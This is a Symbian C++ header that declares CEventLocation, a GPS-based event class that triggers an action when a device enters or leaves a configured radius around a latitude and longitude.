/*
 ============================================================================
 Name		: EventLocation.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventTimer declaration
 ============================================================================
 */

#ifndef EVENTLOCATION_H
#define EVENTLOCATION_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include "AbstractEvent.h"
#include <HT\GPSPosition.h>

// CLASS DECLARATION

typedef struct TLocationStruct
	{
	TUint32 iExitAction;
	TUint32	iConfDistance;
	TReal64 iLatOrigin;	
	TReal64	iLonOrigin;	
	} TLocationStruct;

	
/**
 *  CEventTimer
 * 
 */
class CEventLocation : public CAbstractEvent, public MPositionerObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventLocation();

	/**
	 * Two-phased constructor.
	 */
	static CEventLocation* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventLocation* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();

private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventLocation(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

	// From MPositionerObserver
	//virtual void HandleGPSPositionL(TPosition position);   // original MB
	virtual void HandleGPSPositionL(TPositionSatelliteInfo position);
	virtual void HandleGPSErrorL(TInt error);

	
private:
	TBool iWasInsideRadius;
	CGPSPosition* iGPS;
	TLocationStruct iLocationParams;
	};

#endif // EVENTLocation_H
